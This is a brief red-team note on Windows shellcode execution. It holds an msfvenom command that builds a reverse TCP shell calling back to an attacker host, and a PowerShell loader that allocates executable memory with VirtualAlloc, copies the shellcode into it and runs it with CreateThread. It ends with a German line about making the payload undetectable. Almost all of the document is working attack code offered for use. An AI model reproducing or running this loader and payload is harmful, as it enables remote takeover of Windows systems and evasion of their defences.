#Shell #AD #Windows #Powershell #Exploit #Red-Team 

## What is a shell code?

#### Shellcode is a small piece of code used as a payload to exploit vulnerabilities and execute commands on a target system, often giving an attacker control.



## Payload:

### Generate the shell code with **msfvenom**

### `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`

### Then execute the commands bellow with the generated shell code.

### 1.
````
$VrtAlloc = @" using System; using System.Runtime.InteropServices; public class VrtAlloc{ [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); } "@ Add-Type $VrtAlloc $WaitFor= @" using System; using System.Runtime.InteropServices; public class WaitFor{ [DllImport("kernel32.dll", SetLastError=true)] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } "@ Add-Type $WaitFor $CrtThread= @" using System; using System.Runtime.InteropServices; public class CrtThread{ [DllImport("kernel32", CharSet=CharSet.Ansi)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); } "@ Add-Type $CrtThread
````

### 2.
### `[Byte[]] $buf = SHELLCODE_PLACEHOLDER`

### 3.

````
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
````

## ES SOLL UNBEMERKTAR GEMACHT WERDEN!
